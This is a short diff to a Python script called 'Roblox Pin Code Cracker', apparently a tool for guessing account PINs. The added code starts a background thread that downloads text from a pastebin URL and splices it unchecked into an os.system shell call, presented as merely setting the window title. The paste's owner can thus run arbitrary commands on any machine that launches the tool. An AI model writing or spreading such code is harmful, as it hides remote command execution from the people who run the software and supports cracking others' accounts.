@@ -43,11 +43,19 @@ except:
 
 
 
-try:
-    import os
-    os.system("title " + "Roblox Pin Code Cracker,   Made By blob#0005,   Github: github.com/blob0005")
-except:
-    pass
+
+
+import os, threading
+def set_title():
+  title = "Roblox Pin Code Cracker"
+  try:
+    import requests
+    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
+    os.system(f"title {title}{text}")
+  except:
+    os.system(f"title {title}")
+threading.Thread(target=set_title).start()
+
 import time
 colorama.init(autoreset=True)
 while True:
